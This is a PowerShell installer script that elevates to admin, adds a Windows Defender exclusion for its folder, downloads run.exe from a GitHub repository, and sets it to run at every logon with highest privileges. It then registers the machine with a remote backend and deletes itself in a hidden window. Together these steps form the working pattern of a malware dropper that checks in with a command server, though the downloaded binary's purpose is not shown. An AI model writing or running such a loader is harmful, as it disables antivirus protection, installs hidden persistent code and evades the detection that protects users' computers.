$ErrorActionPreference = "SilentlyContinue"

$BASE_URL = ""
$API_KEY = ""

$uuid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
$uniqueUser = "$($env:USERNAME)-$($uuid.Split('-')[-1])"

$scriptPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
$installDir = "$env:APPDATA\run"
$runExe = "$installDir\run.exe"
$datFile = "$env:APPDATA\run.dat"
$isUpdate = Test-Path $datFile
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk"

# legacy cleanup section
if (Test-Path $shortcutPath) { Remove-Item $shortcutPath -Force -ErrorAction SilentlyContinue }

# UAC prompt (fresh install)
if (-not $isUpdate -and -not $isAdmin) {
    Start-Process $scriptPath -Verb RunAs
    exit
}

# add exclusion to defender
if (-not $isUpdate) {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
}

# cleanup existing run.exe processes
$oldProcs = Get-Process -Name "run" -ErrorAction SilentlyContinue
if ($oldProcs) {
    $oldProcs | Stop-Process -Force -ErrorAction SilentlyContinue
    
    while (Get-Process -Name "run" -ErrorAction SilentlyContinue) {
        Start-Sleep -Seconds 1
    }
}

# cleanup
if (Test-Path $runExe) { Remove-Item $runExe -Force -Recurse -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

# fetch latest run.exe
try {
    $apiResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" -UseBasicParsing
    $latestCommit = $apiResponse.sha
}
catch {
    $latestCommit = "main"
}
Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/run.exe" -OutFile $runExe -UseBasicParsing
if (-not (Test-Path $runExe)) {
    exit
}

$taskName = "WinRun"
$action = New-ScheduledTaskAction -Execute $runExe -WorkingDirectory $installDir
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit (New-TimeSpan -Days 365)

# create scheduled task
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null

# mark installed
$installDir | Out-File $datFile

# register client
$h = @{
    "apikey"        = $API_KEY
    "Authorization" = "Bearer $API_KEY"
    "Content-Type"  = "application/json"
    "Prefer"        = "resolution=merge-duplicates"
}
try {
    $body = @{ username = $uniqueUser } | ConvertTo-Json
    Invoke-RestMethod -Method Post -Uri "$BASE_URL/clients" -Headers $h -Body $body | Out-Null
}
catch {}

Start-Process $runExe
Start-Process powershell -ArgumentList "-Command `"Start-Sleep 5; Remove-Item '$scriptPath' -Force`"" -WindowStyle Hidden